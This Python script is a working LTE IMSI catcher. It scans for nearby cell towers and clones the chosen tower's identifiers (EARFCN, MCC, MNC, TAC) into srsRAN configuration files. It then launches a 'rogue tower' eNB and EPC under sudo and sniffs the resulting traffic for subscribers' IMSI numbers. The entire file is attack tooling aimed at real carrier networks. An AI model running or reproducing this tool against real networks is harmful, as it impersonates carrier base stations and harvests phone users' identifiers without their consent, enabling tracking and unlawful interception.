import pyshark
import argparse
import time
import subprocess
import re
import os
from decimal import Decimal
import sys
import signal
import psutil

parser = argparse.ArgumentParser()
parser.add_argument("cell_search_binary", help="Path to cell_search binary.")
parser.add_argument("-b", help="Cell band to scan for towers.", type=str)
args = parser.parse_args()


def kill(proc_pid):
    process = psutil.Process(proc_pid)
    for proc in process.children(recursive=True):
        proc.kill()
    process.kill()


def capture_live_packets(network_interface):
    capture = pyshark.LiveCapture(interface=network_interface, display_filter="e212.imsi")
    for raw_packet in capture.sniff_continuously():
        print(filter_all_tcp_traffic_file(raw_packet))

def filter_all_tcp_traffic_file(packet):
    """
    This function is designed to parse all the Transmission Control Protocol(TCP) packets
    :param packet: raw packet
    :return: specific packet details
    """
    #packet = packet
    if packet.s1ap:
        s1ap_layer = packet.s1ap
        checkme = str(s1ap_layer)
        imsi_start = checkme.find("IMSI")

        imsi_end = imsi_start + 31
        imsi = checkme[imsi_start:imsi_end]
        print(imsi)
    else:
        pass


if not args.b:
    print("Didn't supply a band to be scanned.\n")
    print("Current band by carrier are:\n")
    print("AT & T\n3G : 850 MHz Cellular, Band 5 (GSM/ GPRS/ EDGE).\n1900 MHz PCS , Band 2 (GSM/ GPRS/ EDGE). \n850 MHz Cellular, Band 5 (UMTS/ HSPA+ up to 21 Mbit/s). \n1900 MHz PCS , Band 2 (UMTS/ HSPA+ up to 21 Mbit/s). 	\n4G : 700 MHz Lower B/C, Band 12/17 (LTE). \n850 MHz Cellular, Band 5 (LTE). \n1700/ 2100 MHz AWS, Band 4 (LTE). \n1900 MHz PCS, Band 2 (LTE). \n2300 MHz WCS, Band 30 (LTE).")
    print("\n")
    print("Boost Mobile\n3G : 850 MHz Cellular, Band 5 (CDMA2000). \1900 MHz PCS, Band 1 (1xRTT/ 1xAdvanced/ EVDO/ eHRPD). 	\n4G : 700 MHz Block C, Band 13 (LTE).")
    print("\n")
    print("Sprint\n3G : 800 MHz ESMR, Band 10 (CDMA/ 1xAdvanced). \n1900 MHz PCS, Band 1 (1xRTT/ 1xAdvanced/ EVDO/ eHRPD).	\n4G : 800 MHz ESMR, Band 26 (LTE). \n1900 MHz PCS, Band 25 (LTE). \n2.5 GHz BRS/ EBS, Band 41 (TD-LTE/ LTE Advanced).")
    print("\n")
    print("T-Mobile\n3G : 1900 MHz PCS, Band 2 (GSM/ GPRS/ EDGE/ UMTS/ HSPA+).	\n4G : 1900 MHz PCS, Band 2 (LTE). \n700 MHz Lower Block A, Band 12 (LTE). \n1700/ 2100 MHz AWS, Band 4 (UMTS/ HSPA+/ LTE).")
    print("\n")
    print("Verizon Wireless\n3G : 850 MHz, Band 0 (CDMA). \n1900 MHz PCS, Band 1 (CDMA).	\n4G : 700 MHz Block C, Band 13 (LTE). \n1900 MHz PCS, Band 1 (1xRTT/ EV-DO/ eHRPD). \n1900 MHz PCS, Band 2 (LTE). \n1700/ 2100 MHz AWS, Band 4 (LTE).")
    print("\n")
    sys.exit(0)
else:

    print("This could take up to 5 minutes to finish.")
    time.sleep(1)
    print("Let this entertain you in the meantime.")
    time.sleep(3)
    proc = subprocess.Popen('fortune | cowsay -f dragon-and-cow | lolcat', shell=True)
    p1 = subprocess.Popen([args.cell_search_binary, '-b', args.b, "-g", "60"], stdout=subprocess.PIPE)
    output = p1.communicate()
    output = str(output)
    num_cells = re.search('Found (\d+) cells', output)
    if not num_cells:
        print("No cells found, try again.")
        sys.exit(1)
    num_cells = num_cells.group(1)
    search_space = output.find('Found')
    #search_space = output.find('pass\\n\\n\\n')
    output = output[search_space + 10:]
    output = output[:-18]
    output = output.split('\\n')
    output = output[1:]
    if num_cells == "0":
        print("No cell towers found, please run again.")
        sys.exit(1)
    cells = []
    for cell in output:
        configs = {}
        for variable in cell.split(","):
            if "=" not in variable:
                pass
            else:
                key, value = variable.split("=")
                configs[key] = value.lstrip()
        cells.append(configs)

p1.terminate()
x = 0
os.system('clear')
 
print("################################################################################################################################")
print("###########################################################  TOWERS  ###########################################################")
print("################################################################################################################################")
num_cells = int(num_cells)
while x < num_cells:

    print("Cell Tower #%d " % (x + 1) + str(cells[x])) # was str(cells[x - 1])
    x += 1
print("################################################################################################################################")
print("################################################################################################################################")
print("################################################################################################################################")
print("\n")

while True:
    try:
        choice = input("Enter what tower number you would like to sniff IMSI\'s on:\n")
        choice = int(choice)
    except ValueError:
        print("You didn't enter a number!\n")
        continue
    if 0 < choice <= num_cells:
        MHz = Decimal(cells[choice - 1]['MHz'])
        MHz = int(float(MHz * 1000000))
        MHz = str(MHz)
        cell_id = cells[choice - 1]['PHYID']
        no_PRBs = cells[choice - 1]['PRB']
        gain = str(80)
        earfcn = cells[choice - 1]['EARFCN']
        
        # Edit ue.conf
        with open("ue.conf", "r") as conf:
            data = conf.readlines()
        data[56] = "dl_earfcn = {}\n".format(earfcn)
        with open('ue.conf', 'w') as conf:
            conf.writelines(data)

        # Get MCC, MNC, TAC
        ue = ["srsue ue.conf"]
        with open("tower_info", "w+") as f:
            execute_ue = subprocess.Popen(ue, shell=True, stdout=f)
            f.read()
        print("Waiting for tower info for rogue tower re-configuration")
        with open("tower_info", "r") as f:
            line = f.readline()
            while not line.startswith("Found PLMN"):
                line = f.readline()
            # ~ mcc = line[16:19]
            # ~ mnc = line[19:21]
            # ~ tac = line[-2]
            line = line.split(',')
            mcc_mnc = str(line[0][line[0].find('Id=')+3:])
            mcc = mcc_mnc[0:3]
            mnc = mcc_mnc[3:]
            tac = str(line[1][line[1].find('TAC=')+4:]).strip()
            # ~ print(mcc)
            # ~ print(mnc)
            # ~ print(tac)
            
        # Edit rr.conf
        rr_conf_location = os.path.expanduser("~/.config/srsran/rr.conf") 
        with open(rr_conf_location, "r") as conf:  # Not a local rr.conf file
            data = conf.readlines()
        data[57] = "    tac = 0x{};\n".format(tac)
        with open(rr_conf_location, 'w') as conf:
            conf.writelines(data)            
            
        # Edit epc.conf
        with open('epc.conf', "r") as conf:  # Local epc.conf file
            data = conf.readlines()
        data[25] = "tac = 0x{}\n".format(tac)
        data[26] = "mcc = {}\n".format(mcc)
        data[27] = "mnc = {}\n".format(mnc)
        with open('epc.conf', 'w') as conf:
            conf.writelines(data)
            
        # Edit enb.conf
        with open('enb.conf', "r") as conf:  # Local enb.conf file
            data = conf.readlines()
        data[22] = "mcc = {}\n".format(mcc)
        data[23] = "mnc = {}\n".format(mnc)
        data[27] = "n_prb = {}\n".format(no_PRBs)
        data[62] = "dl_earfcn = {}\n".format(earfcn)
        with open('enb.conf', 'w') as conf:
            conf.writelines(data)
            
        # Kill Temporary UE
        kill(execute_ue.pid)
        
        # Spin up Rogue Tower
        print("Configuration of rogue tower complete.......")
        print("Spinning up rogue tower in two new tabs.")
        os.system("gnome-terminal --window --title='srsENB' -- /bin/bash -c 'sudo srsenb enb.conf';")
        print("ENB up!")
        os.system("gnome-terminal --window --title='srsEPC' -- /bin/bash -c 'sudo srsepc epc.conf';")
        print("EPC up!")
        print("Capturing packets and searching for IMSI\'s")
        capture_live_packets('lo')

    else:
        if choice > num_cells or choice == 0:
            print("Not an available cell tower, please choose again!\n")
            continue
        else:
            break

